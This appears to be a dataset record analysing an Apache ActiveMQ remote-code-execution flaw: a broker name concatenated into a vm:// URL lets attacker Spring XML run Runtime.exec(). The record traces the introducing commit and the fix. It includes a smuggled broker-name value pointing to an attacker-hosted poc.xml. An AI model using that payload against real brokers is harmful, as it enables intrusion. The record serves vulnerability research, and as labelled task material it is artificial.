bug_semantics: Authenticated Jolokia/JMX callers of DestinationView.sendTextMessage* build a VM transport URL by concatenating "vm://" with ManagedRegionBroker.getBrokerName(). A malicious broker name that includes a query such as "?brokerConfig=xbean:http://attacker/poc.xml" (RegionBroker.setBrokerName was public and unvalidated, bypassing BrokerService's illegal-character rewrite) makes VMTransportFactory treat the host as a missing broker and load attacker-controlled Spring XML through XBeanBrokerFactory. ResourceXmlApplicationContext instantiates singleton beans before BrokerService validates the configuration, so factory methods such as Runtime.exec() run in the broker JVM.
flaw_origin: On 2006-03-07 Hiram R. Chirino added DestinationView.sendTextMessage as a JMX test-message helper and first wrote String brokerUrl = "vm://"+broker.getBrokerName() with no quoting, allowlist, or use of the broker's existing VM connector URI. That concatenation is the first write of the sink later patched in #1913; the 2008 username/password overload, 2007 checkstyle spacing, and 2012 activemq-core to activemq-broker move only carried the same line.

reasoning: CVE-2026-41044 is a published Apache advisory (CVE.org state PUBLISHED, not withdrawn/rejected) for authenticated RCE: a crafted broker name carrying an xbean binding is concatenated into a vm:// URL inside DestinationView.sendTextMessage, VMTransportFactory then creates a new broker from brokerConfig, and Spring instantiates attacker beans before BrokerService validation. The lines the 6.2.5/5.19.6 patch actually change are that concatenation. git log -L and -S both bottom out at 07d4e8c63de63e589b7bf807fecdf64d167565d3, which added sendTextMessage with vm://+getBrokerName(); the immediate parent 4af97546537765c015951f9500ced2f36271122a still has DestinationView.java but lacks sendTextMessage and the vm:// construction, so this is the smallest first-write rather than a move or squash. Checkstyle, the 2008 overload, and the 2012 module split only reformatted or relocated the same mechanism. The original fix on main is 95eeb906d74ff02665dd8a1b3f084e824a10648c (cherry-picked onto the 6.2.5 and 5.19.6 release lines), switching to broker.getVmConnectorURI() so a tainted broker name can no longer become a VM URI query. BIC precedes the entire affected range (present since activemq-4.0; still on 5.19.5 and 6.2.4).
